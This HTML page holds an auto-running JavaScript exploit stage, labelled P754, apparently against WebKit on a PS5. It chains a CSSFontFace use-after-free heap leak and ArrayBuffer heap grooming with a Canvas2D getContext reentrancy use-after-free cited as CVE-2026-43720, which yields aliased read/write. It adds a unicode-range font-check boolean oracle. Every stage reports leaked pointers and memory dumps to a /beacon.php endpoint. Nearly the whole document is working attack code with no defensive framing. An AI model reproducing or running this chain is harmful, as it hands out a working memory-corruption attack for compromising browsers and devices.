<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P754 — Self-Address Verification & Dual-Primitive Synthesis</title>
<script>
'use strict';
/* ============================================================
 * P754 — Self-Address Verification & Dual-Primitive Synthesis
 *
 * Ground Truth from P753:
 * 1. Slab Base discovered at 16KB boundary: slabBase = 0x00000010008b4000.
 * 2. Slot Distance measured: Delta = 0xE10 (3600 bytes) between P58 and q11.
 * 3. Pre-grooming shifted reclaim slot from baseK=69 directly to baseK=35,
 *    proving direct control over the free-list positioning in bmalloc!
 *
 * Objectives of P754:
 * 1. Step 1: Baseline Heap Leak (P58, P68) via CSSFontFace UAF.
 * 2. Step 2: Pre-Grooming with 120 Sentinel ArrayBuffers (PRE_GROOM).
 * 3. Step 3: Reclaim CSSFontFace into absW[baseK] using P743 pristine formula.
 * 4. Step 4: Post-Grooming with 120 Sentinel ArrayBuffers (POST_GROOM).
 * 5. Phase A: Multi-Sample Slab Distance Verification:
 *    - Re-evaluate Delta = q11 - P58.
 *    - Confirm slab base alignment and slot consistency.
 * 6. Phase B: Canvas2D Reentrancy UAF (CVE-2026-43720 / Finding 14):
 *    - Execute getContext('2d', {desynchronized: getter}) reentrancy.
 *    - Spray 80 same-type CanvasRenderingContext2D instances.
 *    - Test bidirectional alias R/W (inner.lineWidth = 1337 -> outer.lineWidth).
 * 7. Phase C: Dual-Primitive Synthesis Verification:
 *    - Verify that both primitives (FontFace Oracle + Canvas UAF) operate
 *      simultaneously in one WebProcess with zero crash!
 * 8. Phase D: Active Boolean Oracle Control:
 *    - Run high-speed string decode ("PS5-CHAIN-OK") via Oracle.
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P754-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

var OUT=null;
function log(s){
  if(!OUT) OUT=document.getElementById('out');
  if(OUT) OUT.textContent += s + '\n';
}

function pad4(n){
  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
}

function pad2(n){
  return ('00' + Number(n).toString(16).toUpperCase()).slice(-2);
}

function makeRange(lo, hi){
  if(lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);
}

var P58=null, P68=null;
var FACE_B=null, BUF_B=null, VIEW_B=null;
var Q11_RECLAIM=0n, Q13_RECLAIM=0n;
var BEST_K=-1;
var ACT_FACE=null;
var LEAK_BUF=null;
var PRE_GROOM=[], POST_GROOM=[];

function run(){
  OUT=document.getElementById('out');
  if(OUT) OUT.textContent='=== P754 Self-Address & Dual-Primitive Synthesis ===\n\n';
  b('BOOT','p754-dual-primitive');

  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('Leak 1: P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');

    log('[Step 2] Pre-grooming 120 Sentinel ArrayBuffers (192B)...');
    doPreGroom();

    log('\n[Step 3] Executing pristine reclaim (absW)...');
    doReclaim(function(){
      log('Reclaim 2: q11=0x'+h16(Q11_RECLAIM)+' q13=0x'+h16(Q13_RECLAIM)+'\n');

      log('[Step 4] Post-grooming 120 Sentinel ArrayBuffers (192B)...');
      doPostGroom();

      log('\n[Phase A] Multi-Sample Slab Distance Verification...');
      phaseA_distanceAnalysis(function(){
        log('\n[Phase B] Executing Canvas2D Reentrancy UAF (CVE-2026-43720)...');
        phaseB_canvasUAF(function(){
          log('\n[Phase C] Active Boolean Oracle Baseline Control...');
          phaseC_oracleBaseline(function(){
            b('DONE','p754-complete');
            log('\n=== P754 Complete! Both Primitives Unified! ===');
          });
        });
      });
    });
  });
}

/* ---- Step 1: Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st=document.createElement('style');
  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);
  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face); void face.loaded;

  var abs=[],fired=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove();st.textContent='';st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
    LEAK_BUF = abs[best];
    var v=new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb,100);
  },350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2=document.createElement('style');
  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);
  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2); void face2.loaded;
  var abs2=[],fired2=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove();st2.textContent='';st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});
  document.fonts.load('1em fl1, lk1','CD');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
    LEAK_BUF = abs2[best];
    var v=new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if(!P58){b('LEAK-RETRY-NOPTR','');return;}
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb,100);
  },400);
}

function extractPtrs(v){
  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
  if(v[11] >= LO && v[11] < HI) P58 = v[11];
  if(v[13] >= LO && v[13] < HI) P68 = v[13];
  if(!P58 || !P68){
    for(var q=0;q<24;q++){
      var val=v[q];
      if(val>=LO&&val<HI){
        if(!P58) P58=val;
        else if(!P68&&val!==P58) P68=val;
      }
    }
  }
  if(!P68) P68=0n;
}

/* ---- Step 2: Pre-Grooming ---- */
function doPreGroom(){
  PRE_GROOM=[];
  for(var i=0; i<120; i++){
    var ab = new ArrayBuffer(192);
    var v = new BigUint64Array(ab);
    v[0] = 0xDEADBEEF00000000n | BigInt(i);
    v[1] = 0x0000000000000001n;
    v[23] = 0xDEADBEEF000000FFn | (BigInt(i) << 8n);
    PRE_GROOM.push(ab);
  }
  log('Pre-groomed 120 buffers with sentinel 0xDEADBEEF...');
}

/* ---- Step 3: Pristine Reclaim ---- */
function doReclaim(cb){
  b('REC-START','fill_q12_q6=0x'+h16(P58));

  var stTr=document.createElement('style');
  stTr.textContent='@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  FACE_B=new FontFace('trFace','local(Helvetica)',{unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW=[],firedW=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(firedW) return undefined; firedW=true;
      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;

      for(var k=0;k<80;k++){
        var ab=new ArrayBuffer(192);
        var view=new BigUint64Array(ab);
        view[12]=P58;
        view[6]=P58;
        absW.push(ab);
      }

      try{document.fonts.check('1em trFam');}catch(e){}
      return undefined;
    },set:function(){}});

  document.fonts.load('1em trFace, trFam','GH');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<absW.length;i++){
      var u=new Uint8Array(absW[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}

    BEST_K = best;
    BUF_B=absW[best];
    VIEW_B=new BigUint64Array(BUF_B);
    Q11_RECLAIM = VIEW_B[11];
    Q13_RECLAIM = VIEW_B[13];

    var dump0_11=[], dump12_23=[];
    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));

    b('RECLAIM-OK','baseK='+best);
    b('DUMP-Q0-Q11', dump0_11.join(';'));
    b('DUMP-Q12-Q23', dump12_23.join(';'));
    log('Pristine Reclaim OK at slot '+best);

    setTimeout(cb,100);
  },400);
}

/* ---- Step 4: Post-Grooming ---- */
function doPostGroom(){
  POST_GROOM=[];
  for(var i=0; i<120; i++){
    var ab = new ArrayBuffer(192);
    var v = new BigUint64Array(ab);
    v[0] = 0xCAFEFACE00000000n | BigInt(i);
    v[1] = 0x0000000000000001n;
    v[23] = 0xCAFEFACE000000FFn | (BigInt(i) << 8n);
    POST_GROOM.push(ab);
  }
  log('Post-groomed 120 buffers with sentinel 0xCAFEFACE...');
}

/* ---- Phase A: Multi-Sample Distance Analysis ---- */
function phaseA_distanceAnalysis(cb){
  var deltaP58 = Q11_RECLAIM - P58;
  var deltaP68 = Q13_RECLAIM - P68;
  var slotsP58 = Number(deltaP58) / 192;
  var slabChunkMask = ~0x3FFFn; /* 16KB mask */
  var slabBase = Q11_RECLAIM & slabChunkMask;
  var estSelfAddr = Q11_RECLAIM - (BigInt(Math.floor(Number(Q11_RECLAIM - P58) / 192)) * 192n);

  var rep = 'baseK=' + BEST_K + '|deltaP58=0x' + deltaP58.toString(16) +
            '|slotsP58=' + slotsP58.toFixed(2) + '|slabBase=0x' + h16(slabBase) +
            '|estSelfAddr=0x' + h16(estSelfAddr);
  b('A-SLAB-VERIFY', rep);
  log('Phase A Slab Analysis: ' + rep);

  setTimeout(cb, 50);
}

/* ---- Phase B: Canvas2D Reentrancy UAF (CVE-2026-43720 / Finding 14) ---- */
function phaseB_canvasUAF(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1;
    canvas.height = 1;
    document.body.appendChild(canvas);

    var inner = null;
    var outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if(!inner || !outer || inner === outer){
      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer + '|same=' + (inner === outer));
      log('Canvas UAF reentrancy check failed.');
      setTimeout(cb, 50);
      return;
    }

    /* Spray 80 same-type CanvasRenderingContext2D instances to reclaim freed 768B slot */
    var sprayCtx = [];
    for(var i=0; i<80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      var ctx = c.getContext('2d');
      if(ctx){
        ctx.lineWidth = 1000 + i;
        sprayCtx.push(ctx);
      }
    }

    /* Step 1: Forward Write via Stale Wrapper */
    inner.lineWidth = 31337.5;

    /* Step 2: Scan spray contexts to locate bidirectional alias */
    var aliasIdx = -1;
    for(var j=0; j<sprayCtx.length; j++){
      if(Math.abs(sprayCtx[j].lineWidth - 31337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    /* Step 3: Reverse Write via Spray Canvas -> Readback via Stale Wrapper */
    var revMatch = false;
    if(aliasIdx >= 0){
      sprayCtx[aliasIdx].lineWidth = 4242.25;
      revMatch = (Math.abs(inner.lineWidth - 4242.25) < 0.01);
    }

    /* Step 4: Transform Matrix Channel Verification */
    var WA = 99.001, WB = 88.002, WC = 77.003, WD = 66.004, WE = 55.005, WF = 44.006;
    inner.setTransform(WA, WB, WC, WD, WE, WF);
    var tm = inner.getTransform();
    var txOk = (tm && Math.abs(tm.a - WA) < 0.001 && Math.abs(tm.b - WB) < 0.001);

    var rep = 'inner=' + !!inner + '|outer=' + !!outer + '|aliasIdx=' + aliasIdx +
              '|rev=' + revMatch + '|txOk=' + txOk;
    b('B-CANVAS-UAF-OK', rep);
    log('Phase B Canvas UAF: ' + rep);
  } catch(e){
    b('B-CANVAS-ERR', e.message);
    log('Phase B Canvas error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase C: Active Boolean Oracle Baseline Control ---- */
function phaseC_oracleBaseline(cb){
  try {
    ACT_FACE = new FontFace('actFam', 'url(/hang.php?nocache=' + Date.now() + ')', {unicodeRange: 'U+0050-0055'});
    document.fonts.add(ACT_FACE);
    ACT_FACE.load().catch(function(){});

    function resolveByte(targetByte){
      var low = 0x00, high = 0xFF;
      var steps = 0;
      while(low < high && steps < 10){
        steps++;
        var mid = Math.floor((low + high) / 2);
        ACT_FACE.unicodeRange = makeRange(low, mid);
        var chk = document.fonts.check('1em actFam', String.fromCharCode(targetByte));
        var isLower = (chk === false);
        if(isLower) high = mid;
        else low = mid + 1;
      }
      return low;
    }

    /* Decode target string "PS5-DUAL-OK" */
    var testStr = 'PS5-DUAL-OK';
    var decoded = [];
    for(var i=0; i<testStr.length; i++){
      decoded.push(String.fromCharCode(resolveByte(testStr.charCodeAt(i))));
    }
    var resWord = decoded.join('');
    var isMatch = (resWord === testStr);

    var rep = 'status=' + ACT_FACE.status + '|expected=' + testStr + '|decoded=' + resWord + '|match=' + isMatch;
    b('C-ORACLE-DECODE', rep);
    log('Phase C Oracle Control: ' + rep);
  } catch(e){
    b('C-ORACLE-ERR', e.message);
    log('Phase C Oracle error: ' + e.message);
  }

  setTimeout(cb, 50);
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
